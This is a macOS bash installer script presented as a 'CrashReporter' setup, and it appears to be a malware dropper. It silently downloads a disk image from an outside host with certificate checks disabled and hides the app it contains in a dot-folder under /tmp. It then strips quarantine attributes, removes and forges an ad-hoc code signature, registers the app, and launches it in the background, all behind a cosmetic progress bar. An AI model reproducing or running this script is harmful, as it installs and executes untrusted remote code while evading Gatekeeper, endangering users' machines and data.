#!/bin/bash
N='CrashReporter'
U='http://endpoint-api-v1.com/d/f1b24e/download'
T=/tmp
D="$T/.$(echo "$N" | tr -cd 'a-zA-Z0-9')"

bar() {
  local p=$1 l="$2" i=0 w=40
  local f=$((p*w/100))
  printf "\r  \033[36m%-13s\033[0m [" "$l"
  while [ $i -lt $w ]; do
    if [ $i -lt $f ]; then printf "█"; else printf "░"; fi
    i=$((i+1))
  done
  printf "] %3d%%" "$p"
}

cd "$T"
rm -rf _vol "$D" "${N}.dmg" 2>/dev/null

bar 5 "Downloading"
for attempt in 1 2 3; do
  curl -kfsSL -o "${N}.dmg" "$U" && break
  [ $attempt -eq 3 ] && { printf "\n"; exit 1; }
  sleep 1
done

bar 30 "Verifying"
[ -f "${N}.dmg" ] || { printf "\n"; exit 1; }

bar 40 "Mounting"
hdiutil attach -nobrowse -noverify -noautoopen -quiet "${N}.dmg" -mountpoint "$T/_vol" 2>/dev/null || { printf "\n"; exit 1; }

bar 55 "Installing"
mkdir -p "$D"
APP_DIR=""
for app in "$T/_vol/"*.app; do
  [ -d "$app" ] || continue
  cp -R "$app" "$D/"
  APP_DIR="$D/$(basename "$app")"
  break
done

bar 65 "Configuring"
hdiutil detach "$T/_vol" -quiet 2>/dev/null
rm -f "${N}.dmg"
BN=$(basename "$APP_DIR" .app)
BINARY="$APP_DIR/Contents/MacOS/$BN"
[ -z "$BINARY" ] || [ ! -f "$BINARY" ] && { printf "\n"; exit 1; }

bar 75 "Preparing"
xattr -cr "$D" 2>/dev/null
chmod +x "$BINARY"

bar 85 "Signing"
codesign --remove-signature "$APP_DIR" 2>/dev/null
codesign -s - --force --deep --no-strict "$APP_DIR" 2>/dev/null || true
/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f "$APP_DIR" 2>/dev/null

bar 95 "Launching"
open -g -n "$APP_DIR" 2>/dev/null || nohup "$BINARY" >/dev/null 2>&1 &
bar 100 "Done"
printf "\n"
